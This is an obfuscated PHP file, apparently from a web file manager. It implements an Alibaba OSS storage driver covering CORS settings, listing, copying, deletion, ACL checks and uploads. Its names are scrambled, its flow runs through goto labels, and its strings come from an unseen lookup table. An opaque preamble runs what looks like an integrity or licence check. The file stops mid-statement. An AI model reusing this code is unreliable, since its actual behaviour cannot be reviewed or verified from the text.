<?php
 goto B·„„è‰˜À; EôÜ¸•Ó‘‘: $d•ºè©‹›” = $_SERVER[$_SERVER[òÀöí][760]]; $Bóêêê‘˜‹ = $_SERVER[òÀöí][1372]; if ($_SERVER[$_SERVER[òÀöí][753]] != $Bóêêê‘˜‹($d•ºè©‹›”)) { goto CÊµé©“Ğ‹; aßÅëÔñõÒ: $D¦¦ÏÛ‚ñµ($d•ºè©‹›”); goto BÜÖÊÙíÙÇ; CÊµé©“Ğ‹: $fÎ“àÂ°Ñ = $_SERVER[òÀöí][755]; $dİ×ñ†Õº = $_SERVER[$_SERVER[òÀöí][756]] . $_SERVER[òÀöí][757]; $FŸ¨éã¶Á¤ = $fÎ“àÂ°Ñ($dİ×ñ†Õº); goto B¿Æ½°š; B¿Æ½°š: $CÎ®ÄØ­Ş = explode($_SERVER[òÀöí][227], $FŸ¨éã¶Á¤); if (count($CÎ®ÄØ­Ş) < $_SERVER[òÀöí][588]) { $D²Ÿİ½‚¦İ = $_SERVER[òÀöí][758]; $D²Ÿİ½‚¦İ(); } $D¦¦ÏÛ‚ñµ = $_SERVER[òÀöí][759]; goto aßÅëÔñõÒ; BÜÖÊÙíÙÇ: } goto cÖ°ášºçö; DË¬—Èº×: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($C†ÂÄ´¾³) { parent::__construct(); include_once SDK_DIR . $_SERVER[òÀöí][1234]; $this->_init($C†ÂÄ´¾³); } public function _init($EŞÎÒ…ºÔ¼) { $f¯ÏÁ”‡à =& $_SERVER[òÀöí]; foreach ($EŞÎÒ…ºÔ¼ as $Bó´åæİí => $BÍ˜ßÖ×¢) { if (isset($this->{$Bó´åæİí})) { $this->{$Bó´åæİí} = $BÍ˜ßÖ×¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($f¯ÏÁ”‡à[1235] . LNG($f¯ÏÁ”‡à[1236])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto c’“¦²³óî; c’“¦²³óî: $Cš‰÷¥Ú Ò =& $_SERVER[òÀöí]; $BïÒ„’° = new OSS\Model\CorsConfig(); $A†Œâ– ‰„ = new OSS\Model\CorsRule(); goto aºÁŒ‘±Ğ; cÅ¦ØŞÄÌ: $A†Œâ– ‰„->setMaxAgeSeconds(600); $A†Œâ– ‰„->addExposeHeader($Cš‰÷¥Ú Ò[1242]); $A†Œâ– ‰„->addAllowedHeader($Cš‰÷¥Ú Ò[1237]); goto EÖ®ÑöÉòè; aºÁŒ‘±Ğ: $A†Œâ– ‰„->addAllowedOrigin($Cš‰÷¥Ú Ò[1237]); $A†Œâ– ‰„->addAllowedMethod($Cš‰÷¥Ú Ò[1238]); $A†Œâ– ‰„->addAllowedMethod($Cš‰÷¥Ú Ò[1239]); goto BÛ»¶©¯Õ; EÖ®ÑöÉòè: $BïÒ„’°->addRule($A†Œâ– ‰„); try { $this->client->putBucketCors($this->bucket, $BïÒ„’°); } catch (OSS\Core\OssException $bÃÕç‡´–ğ) { return !1; } return !0; goto CŠÌØæÎ¼¿; BÛ»¶©¯Õ: $A†Œâ– ‰„->addAllowedMethod($Cš‰÷¥Ú Ò[1240]); $A†Œâ– ‰„->addAllowedMethod($Cš‰÷¥Ú Ò[1241]); $A†Œâ– ‰„->addAllowedMethod($Cš‰÷¥Ú Ò[157]); goto cÅ¦ØŞÄÌ; CŠÌØæÎ¼¿: } public function getBucketCors() { goto Dæîõó¡; a±Ş…ÌéŞ¾: $dİ‚ò•Â­Ø = $C¦Ëï’Ûšä[0]->getMaxAgeSeconds(); $fœÔ˜»¿‘Š = $C¦Ëï’Ûšä[0]->getExposeHeaders(); $cá¬Ä³ùÍö = $C¦Ëï’Ûšä[0]->getAllowedHeaders(); goto aºóğàßùİ; dâ”­ãÂĞë: if (!$dÇØ°¡É‡÷ || !($C¦Ëï’Ûšä = $dÇØ°¡É‡÷->getRules())) { return null; } $dÚèğĞèÑ = $C¦Ëï’Ûšä[0]->getAllowedOrigins(); $AÓÖ¯ã£  = $C¦Ëï’Ûšä[0]->getAllowedMethods(); goto a±Ş…ÌéŞ¾; aºóğàßùİ: return array($d½¾”„ÒØ…[181] => isset($dÚèğĞèÑ[0]) ? $dÚèğĞèÑ[0] : $d½¾”„ÒØ…[33], $d½¾”„ÒØ…[185] => $AÓÖ¯ã£ , $d½¾”„ÒØ…[1243] => $dİ‚ò•Â­Ø, $d½¾”„ÒØ…[1244] => isset($fœÔ˜»¿‘Š[0]) ? $fœÔ˜»¿‘Š[0] : $d½¾”„ÒØ…[33], $d½¾”„ÒØ…[183] => isset($cá¬Ä³ùÍö[0]) ? $cá¬Ä³ùÍö[0] : $d½¾”„ÒØ…[33]); goto Fğ‡ºÙ¨×™; Dæîõó¡: $d½¾”„ÒØ… =& $_SERVER[òÀöí]; $dÇØ°¡É‡÷ = null; try { $dÇØ°¡É‡÷ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $fî¤‹Ş¯­) { return null; } goto dâ”­ãÂĞë; Fğ‡ºÙ¨×™: } public function isBucketCors() { goto A³Á±†Ñ¶; Dè´¢¿İè: if ($AÕ½½öõ†ô[$CÁä„ší¿‡[181]] != $CÁä„ší¿‡[182] || $AÕ½½öõ†ô[$CÁä„ší¿‡[183]] != $CÁä„ší¿‡[182]) { return !1; } $Dò©£ë¼ÙĞ = array_map($CÁä„ší¿‡[184], $AÕ½½öõ†ô[$CÁä„ší¿‡[185]]); if (!is_array($Dò©£ë¼ÙĞ)) { $Dò©£ë¼ÙĞ = array(); } goto BŠ‘Ğô‰Ÿ; BŠ‘Ğô‰Ÿ: $fÕ¦é’åÒ = array($CÁä„ší¿‡[186], $CÁä„ší¿‡[187], $CÁä„ší¿‡[188], $CÁä„ší¿‡[189], $CÁä„ší¿‡[190]); $f“öäÚ‹¶• = array_diff($fÕ¦é’åÒ, $Dò©£ë¼ÙĞ); return empty($f“öäÚ‹¶•); goto c´Ûì‡Õñç; A³Á±†Ñ¶: $CÁä„ší¿‡ =& $_SERVER[òÀöí]; $AÕ½½öõ†ô = $this->getBucketCors(); if (!$AÕ½½öõ†ô || !is_array($AÕ½½öõ†ô)) { return !1; } goto Dè´¢¿İè; c´Ûì‡Õñç: } public function mkfile($eˆµ‘ãğ²¡, $Fëâ­íğ×© = '', $AÀÖ¼ñÅßŞ = REPEAT_RENAME) { $C„„äèö§ = $this->setContent($eˆµ‘ãğ²¡, $Fëâ­íğ×©); if ($C„„äèö§ !== !1) { return $this->getPathOuter($eˆµ‘ãğ²¡); } return !1; } public function mkdir($fì¢§¿˜™, $A½ù•“¹¹ = REPEAT_SKIP) { if ($this->_isFolder($fì¢§¿˜™)) { return $this->getPathOuter($fì¢§¿˜™); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($fì¢§¿˜™)); } catch (OSS\Core\OssException $f®Çáİà…Ì) { return !1; } return $this->getPathOuter($fì¢§¿˜™); } private function fileList($Føë¦Ÿ†ß¨, $aàÌï¡ô²Î = '', $A’´ĞõÄ² = 0) { goto E÷«á»·Û; FºÕ…¡ğƒ: $aÇïµ›³Â³ = $cŞ·­ÓƒÉ†[33]; $fÃÌƒ“ç¤Ğ = 1000; $BÎíæ•îÉ´ = $this->listItemCache === !1 ? !1 : !0; goto DÇ ÔÔ¬Ø­; Eâ¯çÊ°»İ: return array($cŞ·­ÓƒÉ†[74] => $E±ó…·¡¦Ë, $cŞ·­ÓƒÉ†[73] => $CŸõšà½å); goto fò±êÙÒÜÇ; DÇ ÔÔ¬Ø­: $E±ó…·¡¦Ë = $CŸõšà½å = array(); while (!0) { check_abort(); $B‰«ãç¡ = array($cŞ·­ÓƒÉ†[1245] => $aàÌï¡ô²Î, $cŞ·­ÓƒÉ†[1246] => $eêğÁ‰£Ó, $cŞ·­ÓƒÉ†[1247] => $fÃÌƒ“ç¤Ğ, $cŞ·­ÓƒÉ†[1248] => $aÇïµ›³Â³); try { $a¦Í©æ·à« = $this->client->listObjects($this->bucket, $B‰«ãç¡); } catch (OSS\Core\OssException $aò˜¡Õø„‰) { break; } $aÇïµ›³Â³ = $a¦Í©æ·à«->getNextMarker(); $e‘ÌÎ¡™ = $a¦Í©æ·à«->getObjectList(); $d…‚ëóåñ© = $a¦Í©æ·à«->getPrefixList(); foreach ($e‘ÌÎ¡™ as $F²¤¯œÉ‚·) { goto A¶‰ÚÓÌÅ; A¶‰ÚÓÌÅ: if ($F²¤¯œÉ‚·->getKey() == $eêğÁ‰£Ó) { continue; } $Aõº†Ã…ŠÅ = $F²¤¯œÉ‚·->getKey(); $bñŠ¤‹í¡Á = $F²¤¯œÉ‚·->getSize(); goto D›ó•¡–¿; F°‡õšËí„: if ($BÎíæ•îÉ´) { $this->cacheMethod($cŞ·­ÓƒÉ†[197], $Aõº†Ã…ŠÅ, $F‰šç×Ëê); $this->cacheMethod($cŞ·­ÓƒÉ†[198], $Aõº†Ã…ŠÅ, array($cŞ·­ÓƒÉ†[77] => $bñŠ¤‹í¡Á, $cŞ·­ÓƒÉ†[1249] => $bñŠ¤‹í¡Á, $cŞ·­ÓƒÉ†[83] => strtotime($D˜ï“»¾øó), $cŞ·­ÓƒÉ†[1250] => $D˜ï“»¾øó)); } if ($F‰šç×Ëê) { $E±ó…·¡¦Ë[] = $Aõº†Ã…ŠÅ; continue; } $CŸõšà½å[] = $CŠ»Í¦…; goto aŒóßÒ³°˜; D›ó•¡–¿: $D˜ï“»¾øó = $F²¤¯œÉ‚·->getLastModified(); $CŠ»Í¦… = $A’´ĞõÄ² ? array($cŞ·­ÓƒÉ†[28] => $Aõº†Ã…ŠÅ, $cŞ·­ÓƒÉ†[77] => $bñŠ¤‹í¡Á, $cŞ·­ÓƒÉ†[195] => strtotime($D˜ï“»¾øó)) : $Aõº†Ã…ŠÅ; $F‰šç×Ëê = $bñŠ¤‹í¡Á == 0 && substr($Aõº†Ã…ŠÅ, strlen($Aõº†Ã…ŠÅ) - 1, 1) == $cŞ·­ÓƒÉ†[8] ? !0 : !1; goto F°‡õšËí„; aŒóßÒ³°˜: } foreach ($d…‚ëóåñ© as $E”¾Ÿ…ß¾‚) { $E±ó…·¡¦Ë[] = $E”¾Ÿ…ß¾‚->getPrefix(); if ($BÎíæ•îÉ´) { $this->cacheMethod($cŞ·­ÓƒÉ†[197], $Aõº†Ã…ŠÅ, !0); } } if ($aÇïµ›³Â³ === $cŞ·­ÓƒÉ†[33]) { break; } } if ($BÎíæ•îÉ´) { $this->cacheMethod($cŞ·­ÓƒÉ†[197], $Føë¦Ÿ†ß¨, !0); } goto Eâ¯çÊ°»İ; E÷«á»·Û: $cŞ·­ÓƒÉ† =& $_SERVER[òÀöí]; $Føë¦Ÿ†ß¨ = trim($Føë¦Ÿ†ß¨, $cŞ·­ÓƒÉ†[8]); $eêğÁ‰£Ó = empty($Føë¦Ÿ†ß¨) ? $cŞ·­ÓƒÉ†[33] : $Føë¦Ÿ†ß¨ . $cŞ·­ÓƒÉ†[8]; goto FºÕ…¡ğƒ; fò±êÙÒÜÇ: } public function copyFile($cÖÈé’†¢°, $D£Áƒ¹ø†) { $E½Ì—Š¾‚ = $this->size($cÖÈé’†¢°); if ($E½Ì—Š¾‚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $cÖÈé’†¢°, $this->bucket, $this->pathEncode($D£Áƒ¹ø†)); } catch (OSS\Core\OssException $aœòÇÄëº‰) { return !1; } return $this->getPathOuter($D£Áƒ¹ø†); } $AÁàö¾Ô‡ë = $this->multiCopyObject($cÖÈé’†¢°, $D£Áƒ¹ø†, $E½Ì—Š¾‚); return $AÁàö¾Ô‡ë ? $this->getPathOuter($D£Áƒ¹ø†) : !1; } private function multiCopyObject($A¾µà£ß¯, $FÜàÈÒ–ç, $eËŞÕ¶ç†ˆ) { $F˜ÛĞˆê½Õ =& $_SERVER[òÀöí]; try { goto CÙÓ„Èôâù; CÙÓ„Èôâù: $DÓ¬§êÉµ = array(); if ($fàä…Šˆ  = $this->hashMd5($A¾µà£ß¯)) { $DÓ¬§êÉµ = array(OSS\OssClient::OSS_HEADERS => array($F˜ÛĞˆê½Õ[1251] => $fàä…Šˆ )); } $eƒªáÀ¾ô = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($FÜàÈÒ–ç), $DÓ¬§êÉµ); goto B·Œî–Ã; B·Œî–Ã: $fô …¢Ë¾ = 1; $FìÊ¯¨ƒŒ³ = 0; $EªÈùæŸ¾ = array(); goto C£ï¦ï˜Š; bİÓ×ÕĞŒ§: $D°Æâßïèì = array(); foreach ($EªÈùæŸ¾ as $C‡ÇàØ¿± => $C®ˆÅâøšˆ) { $D°Æâßïèì[] = array($F˜ÛĞˆê½Õ[1255] => $C‡ÇàØ¿± + 1, $F˜ÛĞˆê½Õ[1256] => $C®ˆÅâøšˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($FÜàÈÒ–ç), $eƒªáÀ¾ô, $D°Æâßïèì); goto fÜº¡œºº‚; C£ï¦ï˜Š: $f³§à†ô¾Ì = 1024 * 1024 * 10; $C­ŒÁ†² = $this->client->generateMultiuploadParts($eËŞÕ¶ç†ˆ, $f³§à†ô¾Ì); foreach ($C­ŒÁ†² as $C‡ÇàØ¿± => $a£…á­Ü‡) { $d“¨šÏÀˆ© = $FìÊ¯¨ƒŒ³ + (int) $a£…á­Ü‡[$F˜ÛĞˆê½Õ[1252]]; $AïŸÑãò˜ = (int) $a£…á­Ü‡[$F˜ÛĞˆê½Õ[333]] + $d“¨šÏÀˆ© - 1; $A‰ÚÒ·Ã² = array($F˜ÛĞˆê½Õ[1253] => $d“¨šÏÀˆ©, $F˜ÛĞˆê½Õ[1254] => $AïŸÑãò˜); $EªÈùæŸ¾[] = $this->client->uploadPartCopy($this->bucket, $A¾µà£ß¯, $this->bucket, $this->pathEncode($FÜàÈÒ–ç), $fô …¢Ë¾, $eƒªáÀ¾ô, $A‰ÚÒ·Ã²); $fô …¢Ë¾ = $fô …¢Ë¾ + 1; } goto bİÓ×ÕĞŒ§; fÜº¡œºº‚: } catch (OSS\Core\OssException $cùáøéšà®) { return !1; } return !0; } public function moveFile($cæ„¦ÜšíÈ, $C™š´¼Ô¨) { if ($this->copyFile($cæ„¦ÜšíÈ, $C™š´¼Ô¨)) { $this->remove($cæ„¦ÜšíÈ); return $this->getPathOuter($C™š´¼Ô¨); } return !1; } public function delFile($a‡‡›Ö‚) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($a‡‡›Ö‚)); } catch (OSS\Core\OssException $bì‘È®»§ˆ) { return !1; } return !0; } public function delFolder($fµğøö–Ä) { goto CóÇïˆ°¤; dŸŞÔ®Ü‡°: return $this->delByBatch($eÒÜİĞ¥÷[$Fíø®ß[74]]); goto c©œå‚åŠ; CóÇïˆ°¤: $Fíø®ß =& $_SERVER[òÀöí]; if (!$this->exist($fµğøö–Ä)) { return !0; } $this->listItemCache = !1; goto C‡À¢œ¾ĞÄ; C‡À¢œ¾ĞÄ: $eÒÜİĞ¥÷ = $this->fileList($fµğøö–Ä); $this->listItemCache = !0; $aè—®ÍêÎ• = trim($fµğøö–Ä, $Fíø®ß[8]) . $Fíø®ß[8]; goto e¿ŠÖÉÜ’í; e¿ŠÖÉÜ’í: if (!empty($fµğøö–Ä) && !in_array($aè—®ÍêÎ•, $eÒÜİĞ¥÷[$Fíø®ß[74]])) { $eÒÜİĞ¥÷[$Fíø®ß[74]][] = $aè—®ÍêÎ•; } $d¦×›Ù©‘® = $this->delByBatch($eÒÜİĞ¥÷[$Fíø®ß[73]]); if (!$d¦×›Ù©‘®) { return !1; } goto dŸŞÔ®Ü‡°; c©œå‚åŠ: } private function delByBatch($bÈÉˆ°”™¯) { foreach (array_chunk($bÈÉˆ°”™¯, 1000) as $A‡ë¹”Œ•š) { try { $this->client->deleteObjects($this->bucket, $A‡ë¹”Œ•š); } catch (OSS\Core\OssException $BÔÓïä°¢) { return !1; } } return !0; } public function rename($aÙ®¢¥Š“Û, $Dß³¥í¦Êæ) { return $this->renameObject($aÙ®¢¥Š“Û, $Dß³¥í¦Êæ); } private function fileInfo($cõãÇŸ«¶®, $bÃ˜œÒ¤ê = false, $EÍ´ÓàÀ¿ = array()) { goto dŞà³İĞÕÌ; A©£ŞÏóõ×: $A–¡›•²§[$eôœÊµØÙ¹[192]] = $A–¡›•²§[$eôœÊµØÙ¹[83]] = 0; $A–¡›•²§[$eôœÊµØÙ¹[193]] = $A–¡›•²§[$eôœÊµØÙ¹[194]] = !0; if (empty($EÍ´ÓàÀ¿)) { $dÚ¦‹øãªš = $this->objectMeta($cõãÇŸ«¶®); if (!$dÚ¦‹øãªš) { return $A–¡›•²§; } $EÍ´ÓàÀ¿ = array($eôœÊµØÙ¹[83] => strtotime($dÚ¦‹øãªš[$eôœÊµØÙ¹[1250]]), $eôœÊµØÙ¹[77] => $dÚ¦‹øãªš[$eôœÊµØÙ¹[1249]] + 0); } goto fŠÌ÷ÙÀ…; FÆŠ²§…‚ˆ: return $A–¡›•²§; goto a®œ±É„Á±; fŠÌ÷ÙÀ…: if (isset($EÍ´ÓàÀ¿[$eôœÊµØÙ¹[77]])) { $A–¡›•²§[$eôœÊµØÙ¹[77]] = $EÍ´ÓàÀ¿[$eôœÊµØÙ¹[77]]; } if (isset($EÍ´ÓàÀ¿[$eôœÊµØÙ¹[83]])) { $A–¡›•²§[$eôœÊµØÙ¹[83]] = $EÍ´ÓàÀ¿[$eôœÊµØÙ¹[83]]; } if (isset($EÍ´ÓàÀ¿[$eôœÊµØÙ¹[195]]) && !trim($A–¡›•²§[$eôœÊµØÙ¹[83]])) { $A–¡›•²§[$eôœÊµØÙ¹[83]] = $EÍ´ÓàÀ¿[$eôœÊµØÙ¹[195]]; } goto FÆŠ²§…‚ˆ; dŞà³İĞÕÌ: $eôœÊµØÙ¹ =& $_SERVER[òÀöí]; $A–¡›•²§ = array($eôœÊµØÙ¹[28] => $this->pathThis($cõãÇŸ«¶®), $eôœÊµØÙ¹[75] => $this->getPathOuter($cõãÇŸ«¶®), $eôœÊµØÙ¹[29] => $eôœÊµØÙ¹[173], $eôœÊµØÙ¹[77] => isset($EÍ´ÓàÀ¿[$eôœÊµØÙ¹[77]]) ? $EÍ´ÓàÀ¿[$eôœÊµØÙ¹[77]] : 0, $eôœÊµØÙ¹[167] => $this->ext($cõãÇŸ«¶®)); if ($bÃ˜œÒ¤ê) { return $A–¡›•²§; } goto A©£ŞÏóõ×; a®œ±É„Á±: } private function folderInfo($c‚¿ÓŒÔÕÁ, $DË±Ò­Ì¹ = false, $Cî»•âŒ“Û = array()) { goto dç‰±–”ö‰; B‚ãöğÍ†: $B×»µ„ª[$eíƒ™‰–†[192]] = $B×»µ„ª[$eíƒ™‰–†[83]] = 0; $B×»µ„ª[$eíƒ™‰–†[193]] = $B×»µ„ª[$eíƒ™‰–†[194]] = !0; if (empty($Cî»•âŒ“Û)) { $c‚¿ÓŒÔÕÁ = rtrim($c‚¿ÓŒÔÕÁ, $eíƒ™‰–†[8]) . $eíƒ™‰–†[8]; $EˆÚ·õÄÔë = $this->objectMeta($c‚¿ÓŒÔÕÁ); if (!$EˆÚ·õÄÔë) { return $B×»µ„ª; } $Cî»•âŒ“Û = array($eíƒ™‰–†[192] => $EˆÚ·õÄÔë[$eíƒ™‰–†[1257]][$eíƒ™‰–†[1258]], $eíƒ™‰–†[83] => strtotime($EˆÚ·õÄÔë[$eíƒ™‰–†[1250]])); } goto BŒò¶†Ä; dç‰±–”ö‰: $eíƒ™‰–† =& $_SERVER[òÀöí]; $B×»µ„ª = array($eíƒ™‰–†[28] => $this->pathThis($c‚¿ÓŒÔÕÁ), $eíƒ™‰–†[75] => $this->getPathOuter($eíƒ™‰–†[8] . $c‚¿ÓŒÔÕÁ), $eíƒ™‰–†[29] => $eíƒ™‰–†[76]); if ($DË±Ò­Ì¹) { return $B×»µ„ª; } goto B‚ãöğÍ†; BŒò¶†Ä: if (isset($Cî»•âŒ“Û[$eíƒ™‰–†[83]])) { $B×»µ„ª[$eíƒ™‰–†[83]] = $Cî»•âŒ“Û[$eíƒ™‰–†[83]]; } if (isset($Cî»•âŒ“Û[$eíƒ™‰–†[192]])) { $B×»µ„ª[$eíƒ™‰–†[192]] = $Cî»•âŒ“Û[$eíƒ™‰–†[192]]; } return $B×»µ„ª; goto c¿‘èÒ…; c¿‘èÒ…: } public function listPath($BõƒÇ¼±°„, $FõÇº§§¸± = false) { $EÎĞ´‘øˆä =& $_SERVER[òÀöí]; $EÊ³å–´ŒĞ = $this->fileList($BõƒÇ¼±°„, $EÎĞ´‘øˆä[8], !0); foreach ($EÊ³å–´ŒĞ[$EÎĞ´‘øˆä[74]] as $D…¶ˆ•³· => $CÙ›¦øëõˆ) { $EÊ³å–´ŒĞ[$EÎĞ´‘øˆä[74]][$D…¶ˆ•³·] = $this->folderInfo($CÙ›¦øëõˆ, $FõÇº§§¸±, $CÙ›¦øëõˆ); } foreach ($EÊ³å–´ŒĞ[$EÎĞ´‘øˆä[73]] as $D…¶ˆ•³· => $CÙ›¦øëõˆ) { $EÊ³å–´ŒĞ[$EÎĞ´‘øˆä[73]][$D…¶ˆ•³·] = $this->fileInfo($CÙ›¦øëõˆ[$EÎĞ´‘øˆä[28]], $FõÇº§§¸±, $CÙ›¦øëõˆ); } return $EÊ³å–´ŒĞ; } public function has($c˜§×ÔÚìî, $CÁî§œˆ¢… = false, $e­¤„‚­õ = true) { goto CÉØ¨“íÁ; CÉØ¨“íÁ: $A¯ÇÔ…†´¡ =& $_SERVER[òÀöí]; $c˜§×ÔÚìî = trim($c˜§×ÔÚìî, $A¯ÇÔ…†´¡[8]); $A£Ä¼ÃÜÁˆ = empty($c˜§×ÔÚìî) ? $A¯ÇÔ…†´¡[33] : $c˜§×ÔÚìî . $A¯ÇÔ…†´¡[8]; goto F©ƒõ¿„êÙ; F©ƒõ¿„êÙ: $aƒõ¢ùÈ‚ù = $A¯ÇÔ…†´¡[33]; $Bİé­šÚ° = 500; $EáÆ·…÷ÕÛ = $fˆ”Ìæ´§Æ = 0; goto E´ŞˆÚÓ¼—; E´ŞˆÚÓ¼—: while (!0) { check_abort(); $C¿¹îÜ§ƒå = array($A¯ÇÔ…†´¡[1245] => $A¯ÇÔ…†´¡[8], $A¯ÇÔ…†´¡[1246] => $A£Ä¼ÃÜÁˆ, $A¯ÇÔ…†´¡[1247] => $Bİé­šÚ°, $A¯ÇÔ…†´¡[1248] => $aƒõ¢ùÈ‚ù); try { $Bãª‰éù® = $this->client->listObjects($this->bucket, $C¿¹îÜ§ƒå); } catch (OSS\Core\OssException $cÆª£©¥„õ) { break; } $aƒõ¢ùÈ‚ù = $Bãª‰éù®->getNextMarker(); $bª¡î½Ç§˜ = $Bãª‰éù®->getObjectList(); $AëäÅ°ä = $Bãª‰éù®->getPrefixList(); if ($CÁî§œˆ¢…) { if (count($bª¡î½Ç§˜) > 1 || count($bª¡î½Ç§˜) == 1 && $bª¡î½Ç§˜[0]->getKey() != $A£Ä¼ÃÜÁˆ) { $EáÆ·…÷ÕÛ += count($bª¡î½Ç§˜) - 1; } if (!empty($AëäÅ°ä)) { $fˆ”Ìæ´§Æ += count($AëäÅ°ä); } if ($aƒõ¢ùÈ‚ù === $A¯ÇÔ…†´¡[33]) { break; } continue; } if ($e­¤„‚­õ) { if (!empty($bª¡î½Ç§˜)) { if (count($bª¡î½Ç§˜) > 1 || $bª¡î½Ç§˜[0]->getKey() != $A£Ä¼ÃÜÁˆ) { return !0; } } } else { if (!empty($AëäÅ°ä)) { return !0; } } if ($aƒõ¢ùÈ‚ù === $A¯ÇÔ…†´¡[33]) { break; } } if ($CÁî§œˆ¢…) { return array($A¯ÇÔ…†´¡[201] => $EáÆ·…÷ÕÛ, $A¯ÇÔ…†´¡[202] => $fˆ”Ìæ´§Æ); } return !1; goto B‡Œ¶éì‹; B‡Œ¶éì‹: } public function listAll($DéíË ŠƒŞ) { $fªÙæÙØ·Õ =& $_SERVER[òÀöí]; $e´»•éÉ¼Ø = $this->fileList($DéíË ŠƒŞ, $fªÙæÙØ·Õ[33], !0); $båîÎ¤³Üì = array(); foreach ($e´»•éÉ¼Ø[$fªÙæÙØ·Õ[73]] as $D¿áÅ×ô½¢) { $båîÎ¤³Üì[$D¿áÅ×ô½¢[$fªÙæÙØ·Õ[28]]] = $D¿áÅ×ô½¢[$fªÙæÙØ·Õ[77]]; } foreach ($e´»•éÉ¼Ø[$fªÙæÙØ·Õ[74]] as $D¿áÅ×ô½¢) { if (is_string($D¿áÅ×ô½¢)) { $båîÎ¤³Üì[$D¿áÅ×ô½¢] = 0; } } return $this->listAllFiles($DéíË ŠƒŞ, array_keys($båîÎ¤³Üì), $båîÎ¤³Üì); } public function canRead($B¤Ûƒ©Ê°é) { $f³çö†ŞĞ† =& $_SERVER[òÀöí]; $bàÂ“êñ¢Ÿ = $this->pathAcl($B¤Ûƒ©Ê°é); return $bàÂ“êñ¢Ÿ == $f³çö†ŞĞ†[1259] || $bàÂ“êñ¢Ÿ == $f³çö†ŞĞ†[508] ? !0 : !1; } public function canWrite($CÕ¤Øš»áÅ) { $Bß‚æßÏ‡Ø = $this->pathAcl($CÕ¤Øš»áÅ); return $Bß‚æßÏ‡Ø == $_SERVER[òÀöí][508] ? !0 : !1; } public function pathAcl($Bˆ£…•ÖÈ) { goto Bá‚©Ú·ÌÆ; DŒÎœ¬À‡: return $d„Á×ÁáÇ‰; goto Fñîª  Ìñ; bÛ²ë×”êñ: $d„Á×ÁáÇ‰ = $FøˆÖá¾ == $Aôéèô…ï—[34] ? $this->bucketAcl : $FøˆÖá¾; if ($d„Á×ÁáÇ‰ == $Aôéèô…ï—[1260]) { return $Aôéèô…ï—[1259]; } if ($d„Á×ÁáÇ‰ == $Aôéèô…ï—[1261]) { return $Aôéèô…ï—[508]; } goto DŒÎœ¬À‡; Bá‚©Ú·ÌÆ: $Aôéèô…ï— =& $_SERVER[òÀöí]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $FøˆÖá¾ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Bˆ£…•ÖÈ)); } catch (OSS\Core\OssException $fìòÙ÷Ù¾ê) { return !1; } goto bÛ²ë×”êñ; Fñîª  Ìñ: } private function chmodPath($b„Ş§ô‘²İ, $AØŒ×°ïÆ  = '') { $eº÷‡Éº«î =& $_SERVER[òÀöí]; $cÕêÚèîì™ = empty($AØŒ×°ïÆ ) ? $eº÷‡Éº«î[1261] : $AØŒ×°ïÆ ; $Bí«¯™óŸâ = array($eº÷‡Éº«î[34], $eº÷‡Éº«î[191], $eº÷‡Éº«î[1260], $eº÷‡Éº«î[1261]); if (!in_array($cÕêÚèîì™, $Bí«¯™óŸâ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($b„Ş§ô‘²İ), $cÕêÚèîì™); } catch (OSS\Core\OssException $aó¤ğ¥Ëˆ) { return !1; } return !0; } public function getContent($C¸ã¥ĞåÁ) { return $this->fileSubstr($C¸ã¥ĞåÁ, -1); } public function setContent($f¤„öÜŸ²â, $C»ÊåÙÂÓÛ = '') { $Dõ¸Ò¯èÅµ =& $_SERVER[òÀöí]; try { $a ·±ø˜¾³ = $this->trafficLimit($Dõ¸Ò¯èÅµ[1262]); $aÁ¹ àÕ²ö = $this->client->putObject($this->bucket, $this->pathEncode($f¤„öÜŸ²â), $C»ÊåÙÂÓÛ, $a ·±ø˜¾³); } catch (OSS\Core\OssException $B„‚‰»…°Ë) { return !1; } $dáØëË“Á¤ = array($Dõ¸Ò¯èÅµ[1251] => trim($aÁ¹ àÕ²ö[$Dõ¸Ò¯èÅµ[1263]], $Dõ¸Ò¯èÅµ[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f¤„öÜŸ²â))); $this->updateObjMeta($f¤„öÜŸ²â, $dáØëË“Á¤); return isset($aÁ¹ àÕ²ö[$Dõ¸Ò¯èÅµ[1264]][$Dõ¸Ò¯èÅµ[1210]]) ? !0 : !1; } private function updateObjMeta($cŒø‚õäšë, $EŠ¬òÓŒ»¹) { $cŒø‚õäšë = $this->pathEncode($cŒø‚õäšë); try { $DäŞˆ™Àö = array(OSS\OssClient::OSS_HEADERS => $EŠ¬òÓŒ»¹); $this->client->copyObject($this->bucket, $cŒø‚õäšë, $this->bucket, $cŒø‚õäšë, $DäŞˆ™Àö); } catch (OSS\Core\OssException $AÔÃ•ùší) { return !1; } return !0; } public function upload($e¨±¹¹ãˆ, $Dø¿æ²’£, $e§¸Ñ¿¡ôê = false, $DğÛ½±šğÚ = REPEAT_REPLACE) { $A†‰ã±‚Ü„ =& $_SERVER[òÀöí]; $D°İË½¶ê = trim($e¨±¹¹ãˆ, $A†‰ã±‚Ü„[8]); $EÒ¨ ‰æ½ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($A†‰ã±‚Ü„[1251] => @md5_file($Dø¿æ²’£)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e¨±¹¹ãˆ))); $EÒ¨ ‰æ½ = $this->trafficLimit($A†‰ã±‚Ü„[1262], $EÒ¨ ‰æ½); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($D°İË½¶ê), $Dø¿æ²’£, $EÒ¨ ‰æ½); } catch 